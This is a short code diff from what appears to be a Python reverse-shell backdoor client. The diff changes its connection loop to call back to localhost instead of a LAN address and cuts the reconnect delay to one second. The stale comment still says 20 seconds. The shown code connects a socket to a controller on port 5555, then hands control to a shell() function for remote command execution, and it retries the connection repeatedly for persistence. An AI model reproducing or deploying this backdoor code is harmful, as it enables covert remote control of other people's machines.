@@ -31,10 +31,10 @@ def reliable_recv():
 # Function to establish a connection to a remote host
 def connection():
     while True:
-        time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
+        time.sleep(1)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
-            # Connect to a remote host with IP '192.168.1.12' and port 5555
-            s.connect(('192.168.1.12', 5555))
+            # Connect to a remote host with IP '127.0.0.1' and port 5555
+            s.connect(('127.0.0.1', 5555))
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
